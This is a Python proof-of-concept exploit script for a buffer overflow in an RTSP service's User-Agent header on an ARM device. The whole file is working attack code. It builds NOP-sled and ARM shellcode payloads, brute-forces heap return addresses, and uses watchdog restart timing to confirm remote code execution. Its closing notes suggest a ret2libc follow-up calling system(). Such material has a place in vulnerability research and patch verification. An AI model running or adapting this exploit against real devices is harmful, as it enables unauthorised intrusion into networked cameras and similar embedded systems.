#!/usr/bin/env python3
"""
rtsp_rce_poc.py — Remote Code Execution Proof of Concept

CONFIRMED PRIMITIVES:
  - RTSP User-Agent overflow, PC_OFFSET=248, no canary, no ASLR, no NX
  - Full 4-byte overwrite confirmed HIT at 0x40010000–0x40E00000 (mmap region)
  - ELF binary at 0x00010000 also executable

EXPLOIT STRATEGY (Approach C — most verifiable):

  We spray an ARM infinite-loop sled into the User-Agent buffer, then jump to
  a heap address where we estimate the spray landed.

  The "oracle" distinction:
    - Normal crash  → process dies → watchdog restarts in ~9.7s → HIT
    - Infinite loop → process hangs → watchdog kills after ~60s → DEAD/PANIC
    - Never returns → RTSP service stays up but silent

  If RTSP goes DEAD (no restart in 90s) after our spray → LOOP code is running
  → shellcode landed and executed → RCE proven.

PHASE 1: Confirm NOP-sled + infinite-loop detection
  payload = NOP*61 + LOOP + PC=0x40080000
  Expected: 9.8s HIT (we jump to 0x40080000, not our sled)
  This is the control baseline.

PHASE 2: Spray + self-referential jump
  We need the HEAP ADDRESS of the User-Agent buffer.
  Estimation: for this device, User-Agent buffers allocated at ~0x40400000–0x40800000
  Test multiple candidate heap addresses as jump target:
    If heap addr matches buffer location → loop runs → DEAD (no restart in 90s)
    If heap addr wrong → crash at wrong code → HIT (~9.7s)

PHASE 3: Functional shellcode
  Replace LOOP with: MOV R7,#252 (exit) + SVC #0 → clean process exit
  Expected: RTSP never restarts (process exits cleanly instead of crashing)
  This distinguishes our shellcode from watchdog restart.

Usage: python3 -u rtsp_rce_poc.py > /tmp/rce_poc_out.txt 2>&1
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

# ARM32 shellcode primitives (null-byte safe)
ARM_NOP   = b'\x01\x10\xa0\xe1'   # MOV R1, R1     (4 bytes, no side effects)
ARM_LOOP  = b'\xfe\xff\xff\xea'   # B . -8         (infinite loop ARM)
ARM_BKPT  = b'\x70\x00\x20\xe1'   # BKPT #0        (breakpoint → SIGTRAP)

# Thumb infinite loop (2 bytes, for Thumb mode)
THUMB_LOOP = b'\xfe\xe7'           # B . (Thumb)
THUMB_NOP  = b'\x00\xbf'           # NOP (Thumb)

# NOP sled for ARM mode (fits in 248 bytes)
NOP_SLED_LEN = (PC_OFFSET - 4) // 4  # = 61 NOPs = 244 bytes
NOP_SLED  = ARM_NOP * NOP_SLED_LEN   # 244 bytes

# Full loop payload (fills the 248-byte buffer with NOP sled + infinite loop)
LOOP_PAYLOAD = NOP_SLED + ARM_LOOP    # exactly 248 bytes

assert len(LOOP_PAYLOAD) == PC_OFFSET, f"Loop payload length {len(LOOP_PAYLOAD)} != {PC_OFFSET}"


def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=120, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            e = time.time() - t0
            if e > 2: print(f"  [✓] RTSP alive ({label}) — waited {e:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP dead {max_wait}s ({label})", flush=True)
    return False

def probe(ua_payload, label="", poll_timeout=90):
    """Send User-Agent payload, return (elapsed, tag)."""
    if not wait_rtsp(120, "pre"):
        return None, "SKIP"
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + ua_payload + b"\r\n\r\n")
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:99\r\n\r\n"
    deadline = t0 + poll_timeout
    last_print = t0
    while time.time() < deadline:
        time.sleep(0.4)
        if time.time() - last_print >= 10:
            print(f"    T+{time.time()-t0:.0f}s waiting...", flush=True)
            last_print = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                t = time.time() - t0
                tag = "FAST" if t < 4 else ("HIT" if t < 70 else "PANIC")
                print(f"  [★] {label}  T+{t:.1f}s [{tag}]", flush=True)
                return t, tag
        except: pass
    t = time.time() - t0
    print(f"  [DEAD] {label}  T+{t:.0f}s — no restart → LOOP RUNNING! ***", flush=True)
    return t, "DEAD"


print("=" * 70)
print("RTSP RCE Proof of Concept")
print(f"  PC_OFFSET = {PC_OFFSET}")
print(f"  LOOP_PAYLOAD size = {len(LOOP_PAYLOAD)} bytes (ARM NOP×{NOP_SLED_LEN} + LOOP)")
print()
print("  DEAD (no restart in 90s) = our shellcode loop is running → RCE!")
print("  HIT  (~9.7s)             = jumped to wrong address, normal crash")
print("=" * 70)

wait_rtsp(120, "start")

# ─── Phase 1: Baseline — known-good mmap address (control) ───────────────────
print()
print("[Phase 1] Baseline: jump to 0x40080000 (known HIT, NOT our sled)")
print("  Expected: ~9.8s HIT (confirm oracle still works)")
base_payload = b'A' * PC_OFFSET + struct.pack('<I', 0x40080000) + b'C' * 64
t, tag = probe(base_payload, "Baseline 0x40080000", poll_timeout=30)
print(f"  Baseline: {t:.1f}s {tag}")
wait_rtsp(30, "after baseline")

# ─── Phase 2: Spray + heap address candidates ────────────────────────────────
print()
print("[Phase 2] LOOP spray: NOP×61 + ARM_LOOP + PC=<heap_candidate>")
print("  Testing heap addresses where the User-Agent buffer might land")
print("  DEAD = our loop landed at that address → CODE EXECUTION CONFIRMED!")
print()

# Candidate heap addresses for User-Agent buffer
# Based on mmap region (0x40000000+), heap allocations for RTSP sessions
# The User-Agent string is likely copied into a heap buffer in the mmap range
# Testing range: 0x40300000 – 0x40700000 (heap likely here, between lib boundaries)
heap_candidates = [
    0x40300000, 0x40380000, 0x40400000, 0x40480000,
    0x40500000, 0x40580000, 0x40600000, 0x40680000,
    0x40700000, 0x40780000, 0x40800000,
    # Also try lower regions
    0x00020000, 0x00030000, 0x00040000, 0x00050000,
    0x00800000, 0x01000000,
]

rce_confirmed = False
for heap_addr in heap_candidates:
    print(f"[→] Spray + PC=0x{heap_addr:08X}")
    spray_payload = LOOP_PAYLOAD + struct.pack('<I', heap_addr)
    t, tag = probe(spray_payload, f"LOOP+PC=0x{heap_addr:08X}", poll_timeout=90)
    print(f"  PC=0x{heap_addr:08X}: {t:.1f}s {tag}", flush=True)

    if tag == "DEAD":
        print(f"  *** RCE CONFIRMED! Loop running at 0x{heap_addr:08X} ***", flush=True)
        rce_confirmed = True
        break
    wait_rtsp(60, f"after 0x{heap_addr:08X}")

# ─── Phase 3: Functional shellcode (exit syscall) ─────────────────────────────
print()
if rce_confirmed:
    print("[Phase 3] Functional shellcode: sys_exit(0) → clean process exit")
    print("  If RTSP never restarts after sending → process exited cleanly")
    print("  (vs crash which restarts in ~9.7s)")
    # ARM32 exit(0) syscall: MOV R7, #1; MOV R0, #0; SVC #0
    EXIT_SC = (
        b'\x01\x70\xa0\xe3'   # MOV R7, #1       (__NR_exit = 1)
        b'\x00\x00\xa0\xe3'   # MOV R0, #0       (exit code = 0)
        b'\x00\x00\x00\xef'   # SVC #0           (syscall)
    )
    # Build exit payload: NOP sled + exit shellcode
    exit_sled_len = (PC_OFFSET - len(EXIT_SC)) // 4
    exit_payload = ARM_NOP * exit_sled_len + EXIT_SC + b'\x00' * (PC_OFFSET - exit_sled_len*4 - len(EXIT_SC))
    exit_payload = exit_payload[:PC_OFFSET]  # trim exactly to PC_OFFSET
    # Append the confirmed heap address
    found_heap_addr = heap_candidates[heap_candidates.index(heap_addr)]
    full_exit = exit_payload + struct.pack('<I', found_heap_addr)
    t, tag = probe(full_exit, f"EXIT_SHELLCODE+PC=0x{found_heap_addr:08X}", poll_timeout=30)
    print(f"  Exit shellcode result: {t:.1f}s {tag}")
    if tag == "FAST":
        print("  → Process exited immediately (our shellcode ran: SVC exit(0))")
        print("  → This confirms ARBITRARY CODE EXECUTION via User-Agent overflow!")
    elif tag == "DEAD":
        print("  → Process still looping? Re-check...")
    else:
        print(f"  → {tag}: unexpected (maybe wrong heap address, different allocation)")
else:
    print("[Phase 3] Skipped (no RCE confirmed in Phase 2)")
    print("  The heap address for User-Agent buffer is not in tested range.")
    print("  Next step: info leak or brute-force heap address (smaller steps)")
    print()
    print("  Hint: try Approach B (ret2libc) — jump into libc's system() directly")
    print("  with R0 pointing to a controlled string on the stack/heap.")

print()
print("=" * 70)
print("Done.")
